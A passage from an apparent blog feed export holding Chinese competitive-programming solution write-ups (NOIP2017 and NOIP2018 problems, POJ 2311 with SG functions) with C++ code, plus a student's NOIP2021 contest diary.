class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (err || top != <span class="number">0</span>) std::cout &lt;&lt; <span class="string">&quot;ERR&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (maxn == o) std::cout &lt;&lt; <span class="string">&quot;Yes&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">else</span> std::cout &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">        t--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>NOIP</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>模拟</tag>
        <tag>栈</tag>
        <tag>2017</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOIP2017」列队 - 线段树</title>
    <url>/noip2017-phalanx/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P3960">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2319">LibreOJ 链接</a></p>
<p><code>Sylvia</code> 是一个热爱学习的女孩子。</p>
<p>前段时间，<code>Sylvia</code>
参加了学校的军训。众所周知，军训的时候需要站方阵。</p>
<p>Sylvia 所在的方阵中有 <span class="math inline">\(n \times m\)</span>
名学生，方阵的行数为 <span class="math inline">\(n\)</span>，列数为
<span class="math inline">\(m\)</span>。</p>
<p>为了便于管理，教官在训练开始时，按照从前到后，从左到右的顺序给方阵中
的学生从 <span class="math inline">\(1\)</span> 到 <span
class="math inline">\(n \times m\)</span> 编上了号码。即：初始时，第
<span class="math inline">\(i\)</span> 行第 <span
class="math inline">\(j\)</span> 列 的学生的编号是 <span
class="math inline">\((i-1)\times m + j\)</span>。</p>
<p>然而在练习方阵的时候，经常会有学生因为各种各样的事情需要离队。在一天
中，一共发生了 <span class="math inline">\(q\)</span>
件这样的离队事件。每一次离队事件可以用数对 <span
class="math inline">\((x,y) (1 \le x \le n, 1 \le y \le m)\)</span>
描述，表示第 <span class="math inline">\(x\)</span> 行第 <span
class="math inline">\(y\)</span> 列的学生离队。</p>
<p>在有学生离队后，队伍中出现了一个空位。为了队伍的整齐，教官会依次下达
这样的两条指令：</p>
<ol type="1">
<li><p>向左看齐。这时第一列保持不动，所有学生向左填补空缺。不难发现在这条
指令之后，空位在第 <span class="math inline">\(x\)</span> 行第 <span
class="math inline">\(m\)</span> 列。</p></li>
<li><p>向前看齐。这时第一行保持不动，所有学生向前填补空缺。不难发现在这条
指令之后，空位在第 <span class="math inline">\(n\)</span> 行第 <span
class="math inline">\(m\)</span> 列。</p></li>
</ol>
<p>教官规定不能有两个或更多学生同时离队。即在前一个离队的学生归队之后，
下一个学生才能离队。因此在每一个离队的学生要归队时，队伍中有且仅有第
<span class="math inline">\(n\)</span> 行 第 <span
class="math inline">\(m\)</span>
列一个空位，这时这个学生会自然地填补到这个位置。</p>
<p>因为站方阵真的很无聊，所以 <code>Sylvia</code>
想要计算每一次离队事件中，离队的同学 的编号是多少。</p>
<p>注意：每一个同学的编号不会随着离队事件的发生而改变，在发生离队事件后
方阵中同学的编号可能是乱序的。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>这道题直接模拟显然超时，通过分析题目，我们可以发现修改都与 <span
class="math inline">\(m\)</span>
列、当前点和最后一个点有关，于是我们可以建 <span class="math inline">\(n
+ 1\)</span> 颗线段树来存储状态。其中前 <span
class="math inline">\(n\)</span> 颗存储 <span
class="math inline">\(n\)</span> 行目前的状态，用第 <span
class="math inline">\(n + 1\)</span> 棵存储第 <span
class="math inline">\(m\)</span>
行的状态。每个线段树只需记录该点是否存在即可。删除点在线段树对应点打上标记，添加点则增加每行计数即可，这样我们就可以知道每行有多少个点，以及可以查询每行第几个点在线段树中的坐标。而对于每行线段树前
<span class="math inline">\(m - 1\)</span>
个点，我们显然可以直接推出；而对于之后的新添加点，我们可以在每一行建一个
<code>std::vector</code> 来存储新建节点的编号。由于询问次数小于 <span
class="math inline">\(3 \times 10^5\)</span>
故该方法可行。最后我们只需要对 <span class="math inline">\(y =
m\)</span> 的情况特判即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">3e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegT</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    SegT *lc, *rc;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SegT</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegT *lc, SegT *rc) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegT *<span class="title">build</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="literal">NULL</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">const</span> <span class="type">int</span> pos, <span class="type">const</span> <span class="type">long</span> <span class="type">long</span> delta)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pos &gt; r || pos &lt; l)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pos == l &amp;&amp; pos == r)</span><br><span class="line">            val += delta;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (pos &lt;= mid) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!lc) lc = <span class="built_in">build</span>(l, mid);</span><br><span class="line">                lc-&gt;<span class="built_in">update</span>(pos, delta);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!rc) rc = <span class="built_in">build</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">                rc-&gt;<span class="built_in">update</span>(pos, delta);</span><br><span class="line">            &#125;</span><br><span class="line">            val = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (lc) val += lc-&gt;val;</span><br><span class="line">            <span class="keyword">if</span> (rc) val += rc-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">const</span> <span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == r)</span><br><span class="line">            <span class="keyword">return</span> l;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!lc) lc = SegT::<span class="built_in">build</span>(l, (l + r) / <span class="number">2</span>);</span><br><span class="line">            <span class="type">int</span> lSize = (r - l) / <span class="number">2</span> + <span class="number">1</span> + lc-&gt;val;</span><br><span class="line">            <span class="keyword">if</span> (pos &lt;= lSize)</span><br><span class="line">                <span class="keyword">return</span> lc-&gt;<span class="built_in">query</span>(pos);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!rc) rc = SegT::<span class="built_in">build</span>((l + r) / <span class="number">2</span> + <span class="number">1</span>, r);</span><br><span class="line">                <span class="keyword">return</span> rc-&gt;<span class="built_in">query</span>(pos - lSize);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; *seg[MAXN + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, q;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">    <span class="type">int</span> max = std::<span class="built_in">max</span>(n, m) + q;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n + <span class="number">1</span>; i++) seg[i] = SegT::<span class="built_in">build</span>(<span class="number">1</span>, max);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> std::vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; tail[MAXN + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">        <span class="type">int</span> x, y;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>, val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (y != m) &#123;</span><br><span class="line">            <span class="type">int</span> pos = seg[x]-&gt;<span class="built_in">query</span>(y);</span><br><span class="line">            seg[x]-&gt;<span class="built_in">update</span>(pos, <span class="number">-1</span>);</span><br><span class="line">            res = pos &lt; m ? (<span class="number">1ll</span> * (x - <span class="number">1</span>) * m + pos) : (tail[x][pos - m]);</span><br><span class="line">            val = res;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> pos = seg[n + <span class="number">1</span>]-&gt;<span class="built_in">query</span>(x);</span><br><span class="line">        seg[n + <span class="number">1</span>]-&gt;<span class="built_in">update</span>(pos, <span class="number">-1</span>);</span><br><span class="line">        res = pos &lt;= n ? (<span class="number">1ll</span> * pos * m) : tail[n + <span class="number">1</span>][pos - n - <span class="number">1</span>];</span><br><span class="line">        tail[n + <span class="number">1</span>].<span class="built_in">push_back</span>(val ? val : res);</span><br><span class="line">        <span class="keyword">if</span> (y == m)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tail[x].<span class="built_in">push_back</span>(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>NOIP</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>线段树</tag>
        <tag>2017</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOIP2018」赛道修建 - 二分答案 + 贪心</title>
    <url>/noip2018-track/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P5021">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2952">LibreOJ 链接</a></p>
<p>C 城将要举办一系列的赛车比赛。在比赛前，需要在城内修建 <span
class="math inline">\(m\)</span> 条赛道。</p>
<p>C 城一共有 <span class="math inline">\(n\)</span>
个路口，这些路口编号为 <span class="math inline">\(1,2, \cdots ,
n\)</span>，有 <span class="math inline">\(n − 1\)</span>
条适合于修建赛道的双向通行的道路，每条道路连接着两个路口。其中，第 <span
class="math inline">\(i\)</span> 条道路连接的两个路口编号为 <span
class="math inline">\(a_i\)</span> 和 <span
class="math inline">\(b_i\)</span>，该道路的长度为 <span
class="math inline">\(l_i\)</span>。借助这 <span class="math inline">\(n
− 1\)</span> 条道路，从任何一个路口出发都能到达其他所有的路口。</p>
<p>一条赛道是一组互不相同的道路 <span class="math inline">\(e_1, e_2,
\cdots , e_k\)</span>，满足可以从某个路口出发，依次经过道路 <span
class="math inline">\(e_1, e_2, \cdots ,
e_k\)</span>（每条道路经过一次，不允许调头）到达另一个路口。一条赛道的长度等于经过的各道路的长度之和。为保证安全，要求每条道路至多被一条赛道经过。</p>
<p>目前赛道修建的方案尚未确定。你的任务是设计一种赛道修建的方案，使得修建的
<span class="math inline">\(m\)</span>
条赛道中长度最小的赛道长度最大（即 <span
class="math inline">\(m\)</span> 条赛道中最短赛道的长度尽可能大）。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题求的是最小赛道的最大值，可二分答案。而难点则在二分答案的判定上。</p>
<p>设二分时赛道长度为 <span
class="math inline">\(\text{limit}\)</span>，我们需要考虑一颗子树上形成的长度满足条件的赛道最多有多少个。对于这个问题，我们可以贪心解决。</p>
<p>设对于 <span class="math inline">\(v\)</span> 为树上一节点，<span
class="math inline">\(u\)</span> 为 <span
class="math inline">\(v\)</span> 的父节点。设以 <span
class="math inline">\(u\)</span>、<span class="math inline">\(v\)</span>
为根的子树分别最多有 <span class="math inline">\(f_u\)</span>、<span
class="math inline">\(f_v\)</span> 个赛道，<span
class="math inline">\(u\)</span> 可利用 <span
class="math inline">\(v\)</span> 的最长路径为 <span
class="math inline">\(g_v\)</span>。</p>
<p>对于 <span class="math inline">\(u \stackrel{w}{\longrightarrow}
v\)</span>，我们有两种情况：</p>
<ul>
<li><span class="math inline">\(w + g_v \ge
\text{limit}\)</span>，此时我们可直接将该边与 <span
class="math inline">\(v\)</span> 中剩余的路径连起来形成一条新的赛道。即
<span class="math inline">\(f_u = f_v + 1\)</span>；</li>
<li><span class="math inline">\(w + g_v \ge
\text{limit}\)</span>，此时我们无法形成一条完整的赛道。此时我们需要将这个路径保存以便后续使用。</li>
</ul>
<p>对于节点 <span class="math inline">\(u\)</span>
保存的路径，我们有两种情况：</p>
<ol type="1">
<li>由于保存的路径端点均为 <span
class="math inline">\(u\)</span>，我们可将两条路径连在一起形成一条赛道；</li>
<li>将路径保存至 <span class="math inline">\(g_u\)</span>，以便 <span
class="math inline">\(u\)</span> 的父节点使用。</li>
</ol>
<p>我们可以证明：我们尽量满足情况 <span
class="math inline">\(1\)</span>，对于无法满足情况 <span
class="math inline">\(1\)</span> 的路径中取最长路径满足情况 <span
class="math inline">\(2\)</span>。这种方法不劣。因为对于 <span
class="math inline">\(u\)</span> 的父节点，我们至多只能形成一条利用
<span class="math inline">\(u\)</span> 的赛道。而对于对 <span
class="math inline">\(u\)</span> 的父节点有用的路径，使用情况 <span
class="math inline">\(1\)</span> 和情况 <span
class="math inline">\(2\)</span> 对答案的贡献是等价的。对于对 <span
class="math inline">\(u\)</span> 的父节点无用的路径，使用情况 <span
class="math inline">\(1\)</span> 显然更优。</p>
<p>对于路径的保存，我们用 <code>multiset</code> 保存，用
<code>lower_bound</code> 查询可连接成赛道的路径即可。时间复杂度 <span
class="math inline">\(O(n \log n \log L)\)</span>，其中 <span
class="math inline">\(L\)</span> 为边权和。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">5e4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    std::multiset&lt;<span class="type">int</span>&gt; s;</span><br><span class="line">&#125; N[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line">    <span class="type">int</span> w;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t, <span class="type">int</span> w) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t), <span class="built_in">w</span>(w) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    N[s].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[s], &amp;N[t], w));</span><br><span class="line">    N[t].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[t], &amp;N[s], w));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(Node *v, <span class="type">int</span> limit, Node *f = <span class="literal">NULL</span>)</span> </span>&#123;</span><br><span class="line">    v-&gt;s.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;v-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;v-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;t == f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">int</span> res = <span class="built_in">dfs</span>(e-&gt;t, limit, v);</span><br><span class="line">        <span class="keyword">if</span> (res + e-&gt;w &gt;= limit) cnt++;</span><br><span class="line">        <span class="keyword">else</span> v-&gt;s.<span class="built_in">insert</span>(res + e-&gt;w);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!v-&gt;s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v-&gt;s.<span class="built_in">size</span>() == <span class="number">1</span>) <span class="keyword">return</span> std::<span class="built_in">max</span>(max, *v-&gt;s.<span class="built_in">begin</span>());</span><br><span class="line">        std::multiset&lt;<span class="type">int</span>&gt;::iterator it = v-&gt;s.<span class="built_in">lower_bound</span>(limit - *v-&gt;s.<span class="built_in">begin</span>());</span><br><span class="line">        <span class="keyword">if</span> (it == v-&gt;s.<span class="built_in">begin</span>() &amp;&amp; v-&gt;s.<span class="built_in">count</span>(*it) == <span class="number">1</span>) it++;</span><br><span class="line">        <span class="keyword">if</span> (it == v-&gt;s.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            max = std::<span class="built_in">max</span>(max, *v-&gt;s.<span class="built_in">begin</span>());</span><br><span class="line">            v-&gt;s.<span class="built_in">erase</span>(v-&gt;s.<span class="built_in">begin</span>());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">            v-&gt;s.<span class="built_in">erase</span>(it);</span><br><span class="line">            v-&gt;s.<span class="built_in">erase</span>(v-&gt;s.<span class="built_in">begin</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a, b, l;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;a, &amp;b, &amp;l);</span><br><span class="line">        <span class="built_in">addEdge</span>(a, b, l);</span><br><span class="line">        max += l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = max;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(&amp;N[<span class="number">1</span>], mid);</span><br><span class="line">        <span class="keyword">if</span> (cnt &gt;= m) l = mid;</span><br><span class="line">        <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, l);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>贪心</tag>
        <tag>二分</tag>
        <tag>二分答案</tag>
      </tags>
  </entry>
  <entry>
    <title>NOIP2021 行记</title>
    <url>/noip2021/</url>
    <content><![CDATA[<p><del>又滚来记流水账了。。。</del></p>
<h1 id="day--">Day -???</h1>
<p>CSP-S 2021 第二轮成绩出来了，72 分，稳过。</p>
<p>我们学校的 NOIP 名单也出来了，全校参赛不到 10 个人。。。</p>
<h1 id="day--2">Day -2</h1>
<p>成功申请停课。。。</p>
<p>顺带在昨天过了 <a
href="https://www.luogu.com.cn/problem/P3371">单源最短路径（弱化版）</a>。<del>调了
2 天的 bug，我太蒻了 QWQ。</del></p>
<p>看了一下图论基础，准备刷一下 DP 题。</p>
<p>考点也出来了，在天府七中（离家好远啊，开车将近一个小时），不过还好终于在成都考了。</p>
<span id="more"></span>
<h1 id="day--1">Day -1</h1>
<p>刷了一下题，摸了一会儿鱼。</p>
<p>看了一下正睿 OI 的题 <del>真难</del>。</p>
<p>打算刷一下 <a href="https://loj.ac/p?tagIds=186">LibreOJ NOIP Round
#1 的题</a>。</p>
<p>顺带复习了一下 KMP 算法和字符串哈希（lyd 的书真好用）。</p>
<h1 id="day-0">Day 0</h1>
<p>上午刷题的时候发现 "INORI FOR U"
买的键盘到了，粉色红轴，就观摩了一会儿。</p>
<p>中午爸爸把身份证送到学校了，顺带还送来了手机。</p>
<p>晚上简简单单的刷了一下题，就去睡觉了。</p>
<h1 id="day-1">Day 1</h1>
<p>早上起晚了，跑着去吃早饭，赶紧吃完早饭就上车。</p>
<p>到了天府七中之后，看了一下，环境比电子科大的好，电脑配置四代 i5 加上
8G 内存，勉强能用。</p>
<p>考试前开了 Linux 开始打板子，结果老师说考试前不能动电脑，然后把 Linux
关了。。。</p>
<p>考试开始后读了一下题。</p>
<p>首先看了一下 T1，看着数据范围应该用 <span
class="math inline">\(O(n)\)</span>
的算法，于是想到了先在输入数据中取到询问最大值，类似于埃氏筛法的算法，最后挨个查询的做法。感觉极限数据的答案会超过
<span class="math inline">\(1 \times
10^7\)</span>，于是数组和筛法的次数都开了两倍，写 +
调用了一个小时就把大样例过了，于是就开始做下一道题。</p>
<p>T2 花了半个小时才读懂，开始想怎么把数拆成二进制后用 k
枚举，然后发现这种方法不可行。最终还是想不出正解，就花了一点时间写了一个
<span class="math inline">\(O(n^m)\)</span>
的复杂度的暴力，大样例花了三秒钟才跑出来，有点慌。</p>
<p>T3 看了一下，很明显是 DP，并且不是背包或线性
DP。知道这道题我写不出来正解后果断打暴力，由于不会将 <span
class="math inline">\(n^2\)</span> 乘在方差里，最终的结果只能用 double
存（精度爆炸）。到了最后也只能过第一个样例。</p>
<p>T4 很明显不可做，花了 80min 写了一个邻接表 + 爆搜（没有处理 opt = 3
的情况），跑路。</p>
<p>这次至少把题做完了。。。</p>
<p>估分：100 + 20 + 12 + 0 = 132</p>
<p>回家看了一下洛谷群，发现第一题可能会被卡。</p>
<p>分数 -= 20。。。</p>
<h1 id="day-2">Day 2</h1>
<p>补文化课 ing</p>
<p>顺带看了一下有道小图灵，省一无望了，<del>可能省二都没了</del>（意料之中）。</p>
<h1 id="day">Day ???</h1>
<p>分数 70 + 0 + 0 + 0 = 70pts，省三。。。</p>
<p>打算在期末调考之前 AFO 了。</p>
]]></content>
      <categories>
        <category>日常</category>
        <category>行记</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>行记</tag>
        <tag>NOIP</tag>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>「POJ 2311」Cutting Game - 博弈论 + SG 函数</title>
    <url>/poj-2311/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="http://poj.org/problem?id=2311">POJ 链接</a></p>
<p>有一张 <span class="math inline">\(w \times h (2 \le w, h \le
200)\)</span>
大小的矩形网格纸片，两名玩家轮流行动。在每一次行动中，任选一张纸片，沿着某一行或某一列的格线剪成两部分。首先剪出
<span class="math inline">\(1 \times 1\)</span>
大小纸片的玩家获胜。两名玩家均以最优策略行动，问先手是否有必胜策略。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>这个问题不好直接问题，我们可以转化以下。我们可以发现剪出 <span
class="math inline">\(1 \times n\)</span> 或 <span
class="math inline">\(n \times 1\)</span>
的玩家必输。于是问题转化为了先剪出 <span class="math inline">\(1 \times
n\)</span> 或 <span class="math inline">\(n \times 1\)</span>
的玩家输。这样我们就可以用 SG 函数解决。</p>
<p>我们设 <span class="math inline">\(\operatorname{SG}(x, y)\)</span>
表示 <span class="math inline">\(x \times y\)</span> 纸片的 SG
函数值。我们可以先初始化 <span
class="math inline">\(\operatorname{SG}(2, 2) = \operatorname{SG}(2, 3)
= \operatorname{SG}(3, 2) = 0\)</span>。接下来我们需要考虑状态转移。</p>
<p>我们可以发现，对于 <span class="math inline">\(x \times y\)</span>
这种纸片，可以拆分成 <span class="math inline">\((i \times y, (x - i)
\times y)\)</span> 以及 <span class="math inline">\((x \times i, x
\times (y - i))\)</span> 这若干种情况。将这若干种情况的 SG 函数值求
<span class="math inline">\(\operatorname{mex}\)</span>
即可。然后对于每种情况就将该情况的两个状态异或即可。等价于下列等式：</p>
<p><span class="math display">\[
\begin{align*}
\operatorname{SG}(x, y) = \operatorname{mex}(&amp;\{t | t =
\operatorname{SG}(i, y) \oplus \operatorname{SG}(x - i, y), i &gt; 2, i
\le x - i\} \cup \\
&amp;\{t | t = \operatorname{SG}(x, i) \oplus \operatorname{SG}(x, y -
i), i &gt; 2, i \le y - i\})
\end{align*}
\]</span></p>
<p>最后答案为当 <span class="math inline">\(\operatorname{SG}(w, h) &gt;
0\)</span> 时先手必胜，否则先手必败。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> w, h;</span><br><span class="line"><span class="type">int</span> sg[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SG</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sg[x][y] != <span class="number">-1</span>) <span class="keyword">return</span> sg[x][y];</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">bool</span>&gt; <span class="title">vis</span><span class="params">(std::max(w, h) + <span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x - i; i++) vis[<span class="built_in">SG</span>(i, y) ^ <span class="built_in">SG</span>(x - i, y)] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= y - i; i++) vis[<span class="built_in">SG</span>(x, i) ^ <span class="built_in">SG</span>(x, y - i)] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    sg[x][y] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (vis[sg[x][y]]) sg[x][y]++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sg[x][y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(sg, <span class="number">-1</span>, <span class="built_in">sizeof</span>(sg));</span><br><span class="line">    sg[<span class="number">2</span>][<span class="number">2</span>] = sg[<span class="number">2</span>][<span class="number">3</span>] = sg[<span 